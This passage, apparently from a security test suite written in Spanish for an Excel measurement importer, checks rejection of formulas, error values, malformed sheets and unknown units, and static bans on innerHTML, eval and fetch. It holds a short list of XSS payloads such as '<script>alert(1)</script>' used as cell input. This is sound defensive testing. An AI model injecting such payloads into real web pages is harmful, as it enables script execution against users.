    }));
    rejected(res, /fórmula/);
  }
  // Fórmula compartida (solo referencia, sin texto) también.
  rejected(await run(book({
    'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', 'Unidad Alfa', { raw: '<c><f t="shared" si="0"/><v>99.95</v></c>' }]]),
  })), /fórmula/);
});

test('cat 3: errores de Excel (#N/A, #REF!) se rechazan y su texto se recorta', async () => {
  const res = await run(book({
    'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', 'Unidad Alfa', { raw: `<c t="e"><v>#REF!${'<'.repeat(0)}${'A'.repeat(500)}</v></c>` }]]),
  }));
  rejected(res, /error de Excel/);
  assert.ok(res.errors.every((e) => e.message.length < 200));
});

// ---------------------------------------------------------------------------
// Categoría 3 · XSS: el contenido de las celdas vuelve en mensajes como texto
// ---------------------------------------------------------------------------

const XSS = ['<img src=x onerror=alert(1)>', '<script>alert(1)</script>', '"><svg onload=alert(1)>', 'javascript:alert(1)'];

test('cat 3/4: payloads XSS en celdas vuelven en los mensajes como texto plano (la vista los pinta con textContent)', async () => {
  for (const x of XSS) {
    const res = await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], [x, x, x]]) }));
    rejected(res);
    // El motor no escapa ni ejecuta: devuelve texto; la seguridad la da textContent (prueba estática abajo).
    assert.ok(res.errors.every((e) => typeof e.message === 'string'));
  }
  // XSS en la cabecera (columna no reconocida) y en el código de error de Excel.
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor', XSS[0]], ['2027-01-10', 'Unidad Alfa', 99.95, 'x']]) })), /no reconocidas/);
});

test('cat 4: la vista pinta errores y vista previa del Excel sin innerHTML ni HTML de datos', () => {
  const view = read('../../src/views/custodian/measurements.js');
  assert.doesNotMatch(view, /innerHTML|outerHTML|insertAdjacentHTML|document\.write|\beval\(|new Function/);
  assert.match(view, /el\('li', \{ text: e\.row \? `Fila \$\{e\.row\}: \$\{e\.message\}` : e\.message \}\)/);
  for (const f of ['../../engine/xlsx.js', '../../engine/xml.js', '../../engine/zip.js', '../../src/lib/inflate.js']) {
    const src = read(f);
    assert.doesNotMatch(src, /innerHTML|DOMParser|\bdocument\.|\bwindow\.|\beval\(|new Function|fetch\(|XMLHttpRequest|import\(/, f);
  }
});

// ---------------------------------------------------------------------------
// Categoría 3 · Tamaños de hoja
// ---------------------------------------------------------------------------

test('cat 3: más filas que CSV_MAX_ROWS, filas fuera de rango o desordenadas y más de 50 columnas se rechazan', async () => {
  const many = [['fecha', 'unidad', 'valor'], ...Array.from({ length: CSV_MAX_ROWS + 1 }, () => ['2027-01-10', 'Unidad Alfa', 99.95])];
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet(many) })), /máximo/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1048577"><c><v>1</v></c></row></sheetData></worksheet>` })), /filas/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="5"><c><v>1</v></c></row><row r="2"><c><v>1</v></c></row></sheetData></worksheet>` })), /fuera de orden/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1"><c r="ZZZ1"><v>1</v></c></row></sheetData></worksheet>` })), /columnas/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1"><c r="B1"><v>1</v></c><c r="A1"><v>1</v></c></row></sheetData></worksheet>` })), /fuera de orden/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1"><c t="s"><v>99999999999</v></c></row></sheetData></worksheet>` })), /texto compartido/);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': `<worksheet xmlns="${NS}"><sheetData><row r="1"><c t="evil"><v>1</v></c></row></sheetData></worksheet>` })), /tipo de celda/);
});

test('cat 3: texto no UTF-8 en una parte se rechaza (sin decodificación permisiva)', async () => {
  const bad = new Uint8Array([...enc.encode(`<worksheet xmlns="${NS}"><sheetData><row><c t="inlineStr"><is><t>`), 0xc3, 0x28, ...enc.encode('</t></is></c></row></sheetData></worksheet>')]);
  rejected(await run(book({ 'xl/worksheets/sheet1.xml': bad })), /UTF-8/);
});

// ---------------------------------------------------------------------------
// Categoría 1 · Sin vía nueva de escritura: unidades y destino
// ---------------------------------------------------------------------------

test('cat 1: una fila con una unidad que no está en la lista de unidades cargada por la vista se rechaza', async () => {
  // Nota: la unidad se resuelve por nombre o por id SOLO contra ctx.units (como en el CSV de M-04);
  // el permiso real lo da RLS sobre el indicador del custodio.
  assert.deepEqual((await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', 'u-beta', 99.95]]) }))).rows.map((r) => r.unitId), ['u-beta']);
  for (const u of ['Unidad Gamma', '00000000-0000-0000-0000-000000000000', 'Unidad Alfa\u0000', 'Unidad Alfa']) {
    rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor'], ['2027-01-10', u, 99.95]]) })), /no existe|fórmula/);
  }
  // Columnas que intentan fijar indicador, id o unidad por id: no reconocidas.
  for (const extra of ['indicator_id', 'unit_id', 'id', 'created_by']) {
    rejected(await run(book({ 'xl/worksheets/sheet1.xml': sheet([['fecha', 'unidad', 'valor', extra], ['2027-01-10', 'Unidad Alfa', 99.95, 'x']]) })), /no reconocidas/);
  }
});

test('cat 1: las filas del Excel tienen la misma forma que las del CSV (sin campos extra hacia el insert)', async () => {
  const res = await run(book());
  assert.deepEqual(Object.keys(res.rows[0]).sort(), ['appId', 'category', 'compliant', 'date', 'kind', 'line', 'unitId', 'value']);
});

test('cat 1: la vista guarda el Excel por el mismo insert del CSV, con el indicador seleccionado (RLS del custodio)', () => {
  const view = read('../../src/views/custodian/measurements.js');
  assert.match(view, /parseMeasurementsXlsx\(bytes, cfg, ctx, inflateRaw\)/);
  // Una sola vía de escritura: insertMeasurements con el indicador actual.
  const inserts = view.match(/insertMeasurements\(/g) ?? [];
  assert.equal(inserts.length, 2, 'import + llamada (sin vías nuevas)'); // import y una llamada
  assert.match(view, /insertMeasurements\(ind\.id, pending\)|insertMeasurements\(state\.current\.id, pending\)|insertMeasurements\([^)]*pending\)/);
  assert.doesNotMatch(view, /\.from\(['"]measurements['"]\)|\/rest\/v1\//);
  const data = read('../../src/data/measurements.js');
  assert.match(data, /toMeasurementRow\(indicatorId, r\)/);
});

// ---------------------------------------------------------------------------
// Categoría 4 · Plantilla .xlsx descargada por blob: (ADR 0011)
// ---------------------------------------------------------------------------

test('cat 4: la plantilla se arma localmente, escapa los nombres de columna y no trae fórmulas ni relaciones externas', async () => {
  const cols = ['fecha', '<x>&"\'', '=1+1'];
  const bytes = buildXlsxTemplate(cols);
  const entries = listZipEntries(bytes);
  const text = [...entries.values()].map((e) => new TextDecoder().decode(bytes.subarray(e.dataStart, e.dataStart + e.compressedSize))).join('\n');
  assert.doesNotMatch(text, /<f>|<f |TargetMode|External|https?:\/\/(?!schemas\.openxmlformats\.org)|<!DOCTYPE|vbaProject|oleObject|externalLink|<x>/i);
  const { rows } = await readFirstSheet(bytes, inflateRaw);
  assert.deepEqual(rows[0].cells.map((c) => c.value), cols);
});

test('cat 4: la descarga usa un blob: propio creado y revocado en la vista, nunca una URL que venga de datos', () => {
  const view = read('../../src/views/custodian/measurements.js');
  assert.match(view, /URL\.createObjectURL\(new Blob\(\[bytes\]/);
  assert.match(view, /URL\.revokeObjectURL\(url\)/);
  assert.match(view, /buildXlsxTemplate\(\[\.\.\.spec\.required, \.\.\.spec\.optional\]\)/);
  // El blob: no se asigna con el ayudante el() (que solo admite http/https/relativas) ni sale a otra ventana.
  assert.doesNotMatch(view, /window\.open|location\.(href|assign|replace)\s*=|target:\s*['"]_blank/);
  // La CSP no se relaja para la descarga ni para DecompressionStream.
  const csp = read('../../src/security/csp.js');
  assert.doesNotMatch(csp, /blob:|unsafe-|wasm/);
});

// ---------------------------------------------------------------------------
// Categoría 6 · Sin dependencias nuevas
// ---------------------------------------------------------------------------

test('cat 6: V-07 no añade dependencias (lector ZIP/XML propio, DecompressionStream nativo)', () => {
  const pkg = JSON.parse(read('../../package.json'));
  const all = { ...pkg.dependencies, ...pkg.devDependencies };
  for (const bad of ['xlsx', 'sheetjs', 'exceljs', 'jszip', 'fflate', 'pako', 'fast-xml-parser', 'xml2js', 'sax', 'node-xlsx']) {
    assert.equal(all[bad], undefined, bad);
  }
  for (const f of ['../../engine/xlsx.js', '../../engine/xml.js', '../../engine/zip.js', '../../src/lib/inflate.js']) {
    const imports = [...read(f).matchAll(/^import .* from ['"]([^'"]+)['"]/gm)].map((m) => m[1]);
    assert.ok(imports.every((p) => p.startsWith('./') || p.startsWith('../')), `${f}: ${imports}`);
  }
});
